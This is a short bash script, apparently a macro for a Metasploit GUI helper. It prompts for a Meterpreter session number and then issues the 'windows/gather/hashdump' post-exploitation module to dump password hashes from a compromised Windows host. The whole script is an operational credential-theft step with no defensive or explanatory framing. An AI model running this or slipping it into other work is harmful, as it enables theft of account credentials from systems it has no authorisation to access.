#!/bin/bash

: '
meterpreter: set windows post hash dump
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
SESSION_FIELD=$(form_item  "SESSION" "number" "SESSION" "-1")

# Generate GUI form
generate_form "${SESSION_FIELD}" 

SESSION=${form_data["SESSION"]}

execute_command "use windows/gather/hashdump"
create_new_line
sleep 0.8

execute_command "set SESSION ${SESSION}"
create_new_line
sleep 0.8

execute_command "exploit"
create_new_line
